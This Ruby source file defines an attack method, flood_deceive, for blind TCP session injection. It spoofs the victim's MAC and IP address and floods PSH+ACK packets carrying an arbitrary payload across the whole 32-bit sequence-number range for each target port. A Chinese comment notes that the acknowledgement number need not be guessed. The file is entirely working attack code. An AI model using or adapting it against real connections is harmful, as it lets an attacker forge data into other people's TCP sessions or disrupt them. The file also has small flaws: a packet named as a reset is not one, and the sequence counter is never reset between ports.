require_relative '../../protocol/tcp_pac.rb'

# 实验发现，确认号可以取任意值，只要序列号命中对方窗口，对方便会接收。故无需对确认号也进行穷举
class TCPP
	def self.flood_deceive(pcap, ports, step=1, from_seq=0, payload)
		room = 2**32
		to_seq = from_seq+2**32

		rst_pac = TCPP.pac_from_pac(TCPP.new){|pac|
			pac.etherh.src_mac = $victim_mac
			pac.ipv4h.set_addr_by_arr($victim_ip, :src)
			pac.tcph.control_flag = "00011000"
			pac.set_app_data(payload)
		}

		seq_num = from_seq
		ports.each do |port|
			rst_pac.tcph.src_port = port
			while seq_num<=to_seq
				rst_pac = TCPP.pac_from_pac(rst_pac){|pac|
					pac.tcph.seq_num = seq_num%room
				}
				pcap.send_packet(rst_pac)
				seq_num += step
			end
		end
	end
end